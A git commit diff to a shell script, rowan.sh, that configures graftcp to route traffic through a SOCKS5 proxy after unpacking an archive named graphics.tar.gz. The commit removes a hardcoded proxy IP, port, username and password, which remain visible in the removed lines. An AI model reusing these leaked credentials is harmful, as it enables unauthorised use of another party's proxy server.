1ef6496a9cbee1c8c40b969f2917319547f23008
PEEBASS <103189634+PEEBASS@users.noreply.github.com>
2022-04-23 17:39:47 +0700

    Update rowan.sh

--- rowan.sh
+++ rowan.sh
@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 154.12.99.211:5551
-socks5_username = lebarankita
-socks5_password = buatTHRan
+socks5 = 
+socks5_username = 
+socks5_password = 
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
